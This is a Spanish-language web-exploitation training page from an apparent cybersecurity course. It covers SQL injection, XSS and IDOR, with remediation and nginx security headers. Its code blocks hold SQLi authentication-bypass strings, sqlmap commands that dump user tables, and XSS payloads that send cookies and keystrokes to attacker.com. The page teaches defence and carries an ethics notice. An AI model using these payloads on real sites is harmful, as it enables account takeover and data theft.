@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>04 - Explotación Web | CDPN | CyberDefense Pro Network</title>
+<link rel="icon" type="image/svg+xml" href="../../favicon.svg">
+<link rel="icon" type="image/png" sizes="32x32" href="../../assets/icons/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="../../assets/icons/favicon-16x16.png">
+<link rel="apple-touch-icon" sizes="180x180" href="../../assets/icons/apple-touch-icon.png">
+<link rel="manifest" href="../../manifest.webmanifest">
+<meta name="description" content="OWASP Top 10: SQLi, XSS, IDOR, SSRF. Explotación y remediación.">
+<meta name="theme-color" content="#0a0e1a">
+<meta name="color-scheme" content="dark light">
+<meta property="og:type" content="website">
+<meta property="og:title" content="04 - Explotación Web | CDPN">
+<meta property="og:description" content="SQLi, XSS, IDOR: explotación y remediación.">
+<meta property="og:url" content="https://0xvanguard.github.io/CyberDefense-Pro-Network/modules/red-team/04-explotacion-web.html">
+<meta property="og:image" content="https://0xvanguard.github.io/CyberDefense-Pro-Network/assets/og/og-image.png">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="canonical" href="https://0xvanguard.github.io/CyberDefense-Pro-Network/modules/red-team/04-explotacion-web.html">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../../assets/css/global.css">
+    <link rel="stylesheet" href="../../assets/css/module.css">
+<link rel="stylesheet" href="../../assets/css/a11y.css">
+</head>
+<body>
+<a href="#main" class="skip-link">Saltar al contenido principal</a>
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="../../index.html" class="nav-logo"><i class="fas fa-shield-halved"></i> CDPN</a>
+            <ul class="nav-menu">
+                <li><a href="../../index.html"><i class="fas fa-home"></i> Inicio</a></li>
+                <li class="nav-dropdown">
+                    <a href="#"><i class="fas fa-layer-group"></i> Módulos <i class="fas fa-chevron-down"></i></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="../introduccion/"><span class="dot intro"></span> Introducción</a></li>
+                        <li><a href="../red-team/" class="active" aria-current="page"><span class="dot red"></span> Ofensiva</a></li>
+                        <li><a href="../seguridad-informacion/"><span class="dot blue"></span> Seguridad Info.</a></li>
+                        <li><a href="../ai-agents/"><span class="dot ai"></span> AI Agents</a></li>
+                        <li><a href="../blue-team/"><span class="dot blue"></span> Blue Team</a></li>
+                        <li><a href="../purple-team/"><span class="dot purple"></span> Purple Team</a></li>
+                        <li><a href="../laboratorios/"><span class="dot lab"></span> Labs</a></li>
+                        <li><a href="../recursos/"><span class="dot resources"></span> Recursos</a></li>
+                    </ul>
+                </li>
+                <li><a href="../../retos.html"><i class="fas fa-trophy"></i> Retos</a></li>
+                <li><a href="../../herramientas.html"><i class="fas fa-tools"></i> Herramientas</a></li>
+                <li><a href="../../labs.html"><i class="fas fa-flask"></i> Labs</a></li>
+                <li><a href="../../recursos.html"><i class="fas fa-book"></i> Recursos</a></li>
+            </ul>
+            <div class="nav-actions">
+                <button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i></button>
+                <a href="https://github.com/0xvanguard/CyberDefense-Pro-Network" class="nav-github" target="_blank"><i class="fab fa-github"></i></a>
+            </div>
+        </div>
+    </nav>
+
+    <div class="breadcrumb">
+        <a href="../../index.html">CDPN</a><span>/</span> <a href="index.html">Red Team</a><span>/</span> 04 — Explotación Web
+    </div>
+
+    <section class="module-hero" style="--hero-glow: rgba(231, 76, 60, 0.08);">
+        <div class="module-hero-content">
+            <span class="module-badge intermediate"><i class="fas fa-globe"></i> INTERMEDIO-AVANZADO</span>
+            <h1>04 — <span class="gradient-text">Explotación Web</span></h1>
+            <p>OWASP Top 10: SQLi, XSS, IDOR. Explotación y remediación.</p>
+        </div>
+    </section>
+
+    <main id="main" class="module-main">
+        <div class="content-block">
+            <h3><i class="fas fa-bullseye"></i> Objetivos de Aprendizaje</h3>
+            <div class="objectives-list">
+                <div class="objective"><i class="fas fa-check-circle"></i> Identificar y explotar SQL Injection.</div>
+                <div class="objective"><i class="fas fa-check-circle"></i> Detectar y ejecutar Cross-Site Scripting (XSS).</div>
+                <div class="objective"><i class="fas fa-check-circle"></i> Explotar IDOR / Broken Access Control.</div>
+                <div class="objective"><i class="fas fa-check-circle"></i> Aplicar mitigaciones y hardening web.</div>
+            </div>
+        </div>
+
+        <div class="content-block">
+            <h3><i class="fas fa-sitemap"></i> Contenido del Módulo</h3>
+            
+            <div class="submodule-card expanded">
+                <div class="submodule-header">
+                    <div class="submodule-num">01</div>
+                    <div class="submodule-info">
+                        <h4><i class="fas fa-database"></i> SQL Injection (SQLi)</h4>
+                        <span class="submodule-phase">OWASP A03:2021</span>
+                    </div>
+                    <i class="fas fa-chevron-down expand-icon"></i>
+                </div>
+                <div class="submodule-content">
+                    <p>Manipular consultas SQL para extraer o modificar datos.</p>
+                    <div class="step-guide">
+                        <div class="guide-step"><span class="guide-num">1</span><div><strong>Identificar:</strong> Parámetros de entrada a bases de datos</div></div>
+                        <div class="guide-step"><span class="guide-num">2</span><div><strong>Probar:</strong> ' OR '1'='1, UNION SELECT, etc.</div></div>
+                        <div class="guide-step"><span class="guide-num">3</span><div><strong>Explotar:</strong> Extraer datos, bypass autenticación</div></div>
+                        <div class="guide-step"><span class="guide-num">4</span><div><strong>Automatizar:</strong> sqlmap para confirmación</div></div>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="code-lang">SQLi</span></div>
+                        <pre><code># Bypass de autenticación
+' OR '1'='1
+' OR '1'='1'--
+
+# UNION-based injection
+' UNION SELECT username,password FROM users--
+
+# sqlmap automatizado
+sqlmap -u "http://target.com/?id=1" --dbs
+sqlmap -u "http://target.com/?id=1" -T users --dump</code></pre>
+                    </div>
+                    <div class="tools-used">
+                        <span class="tool-tag"><i class="fas fa-database"></i> sqlmap</span>
+                        <span class="tool-tag"><i class="fas fa-bug"></i> Burp Suite</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="submodule-card">
+                <div class="submodule-header">
+                    <div class="submodule-num">02</div>
+                    <div class="submodule-info">
+                        <h4><i class="fas fa-code"></i> Cross-Site Scripting (XSS)</h4>
+                        <span class="submodule-phase">OWASP A07:2021</span>
+                    </div>
+                    <i class="fas fa-chevron-down expand-icon"></i>
+                </div>
+                <div class="submodule-content">
+                    <p>Inyectar scripts maliciosos en páginas web.</p>
+                    <div class="step-guide">
+                        <div class="guide-step"><span class="guide-num">1</span><div><strong>Reflejado:</strong> Payload en URL, se ejecuta al hacer clic</div></div>
+                        <div class="guide-step"><span class="guide-num">2</span><div><strong>Almacenado:</strong> Payload guardado en BD, se ejecuta para todos</div></div>
+                        <div class="guide-step"><span class="guide-num">3</span><div><strong>DOM-based:</strong> Manipulación del DOM del navegador</div></div>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="code-lang">XSS</span></div>
+                        <pre><code># XSS reflejado básico
+<script>alert('XSS')</script>
+
+# Robo de cookies
+<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
+
+# Keylogger
+<script>document.onkeypress=function(e){new Image().src="http://attacker.com/k?k="+e.key}</script></code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="submodule-card">
+                <div class="submodule-header">
+                    <div class="submodule-num">03</div>
+                    <div class="submodule-info">
+                        <h4><i class="fas fa-unlock-alt"></i> IDOR / Broken Access Control</h4>
+                        <span class="submodule-phase">OWASP A01:2021</span>
+                    </div>
+                    <i class="fas fa-chevron-down expand-icon"></i>
+                </div>
+                <div class="submodule-content">
+                    <p>Acceder a recursos ajenos cambiando IDs o parámetros.</p>
+                    <div class="step-guide">
+                        <div class="guide-step"><span class="guide-num">1</span><div><strong>Identificar:</strong> URLs con IDs numéricos o predecibles</div></div>
+                        <div class="guide-step"><span class="guide-num">2</span><div><strong>Probar:</strong> Cambiar ID por otro valor</div></div>
+                        <div class="guide-step"><span class="guide-num">3</span><div><strong>Explotar:</strong> Acceder a datos de otros usuarios</div></div>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="code-lang">IDOR</span></div>
+                        <pre><code># Original
+https://app.com/api/user/12345
+
+# Probar con otro ID
+https://app.com/api/user/12346
+https://app.com/api/user/12347
+
+# Si devuleve datos → IDOR confirmado</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="submodule-card">
+                <div class="submodule-header">
+                    <div class="submodule-num">04</div>
+                    <div class="submodule-info">
+                        <h4><i class="fas fa-shield-alt"></i> Defensa y Hardening</h4>
+                        <span class="submodule-phase">Blue Team</span>
+                    </div>
+                    <i class="fas fa-chevron-down expand-icon"></i>
+                </div>
+                <div class="submodule-content">
+                    <p>Mitigar vulnerabilidades web identificadas.</p>
+                    <div class="step-guide">
+                        <div class="guide-step"><span class="guide-num">1</span><div><strong>SQLi:</strong> Queries parametrizadas, WAF</div></div>
+                        <div class="guide-step"><span class="guide-num">2</span><div><strong>XSS:</strong> Sanitización, CSP headers, encoding</div></div>
+                        <div class="guide-step"><span class="guide-num">3</span><div><strong>IDOR:</strong> Control de acceso por recurso, UUIDs</div></div>
+                        <div class="guide-step"><span class="guide-num">4</span><div><strong>Headers:</strong> X-Frame-Options, X-Content-Type-Options</div></div>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="code-lang">Nginx</span></div>
+                        <pre><code># Headers de seguridad
+add_header X-Frame-Options "SAMEORIGIN";
+add_header X-Content-Type-Options "nosniff";
+add_header X-XSS-Protection "1; mode=block";
+add_header Content-Security-Policy "default-src 'self'";</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="content-block">
+            <h3><i class="fas fa-tools"></i> Herramientas Principales</h3>
+            <div class="tools-grid">
+                <div class="tool-card">
+                    <div class="tool-icon"><i class="fas fa-bug"></i></div>
+                    <h4>Burp Suite</h4>
+                    <p>Interceptación y análisis de tráfico web.</p>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-icon"><i class="fas fa-database"></i></div>
+                    <h4>sqlmap</h4>
+                    <p>Automatización de SQL injection.</p>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-icon"><i class="fas fa-spider"></i></div>
+                    <h4>Gobuster / ffuf</h4>
+                    <p>Enumeración de directorios y fuzzing.</p>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-icon"><i class="fas fa-flask"></i></div>
+                    <h4>DVWA / Juice Shop</h4>
+                    <p>Aplicaciones vulnerables para practicar.</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="content-block">
+            <h3><i class="fas fa-exclamation-triangle"></i> Aviso Ético</h3>
+            <div class="ethics-notice">
+                <p><i class="fas fa-gavel"></i> <strong>CRÍTICO:</strong> Todo lo practicado en este módulo debe permanecer dentro de laboratorios, entornos controlados o plataformas autorizadas. Nunca ejecutes payloads sobre sistemas de terceros sin permiso formal.</p>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-grid">
+                <div class="footer-col"><h4><i class="fas fa-shield-halved"></i> CDPN</h4><p>Formando profesionales de ciberdefensa.</p></div>
+                <div class="footer-col"><h4>Módulos</h4><ul><li><a href="../introduccion/">Introducción</a></li><li><a href="index.html">Red Team</a></li><li><a href="../blue-team/">Blue Team</a></li><li><a href="../purple-team/">Purple Team</a></li></ul></div>
+                <div class="footer-col"><h4>Secciones</h4><ul><li><a href="../fundamentos/">🚀 Base para principiantes</a></li><li><a href="../../retos.html">Retos</a></li><li><a href="../../herramientas.html">Herramientas</a></li><li><a href="../../labs.html">Labs</a></li></ul></div>
+                <div class="footer-col"><h4>GitHub</h4><ul><li><a href="https://github.com/0xvanguard/CyberDefense-Pro-Network"><i class="fab fa-github"></i> Repo</a></li></ul></div>
+            </div>
+            <div class="footer-bottom"><p>&copy; 2026 CDPN. Todos los derechos reservados.</p></div>
+        </div>
+    </footer>
+    <script src="../../assets/js/shared.js"></script>
+</body>
+</html>
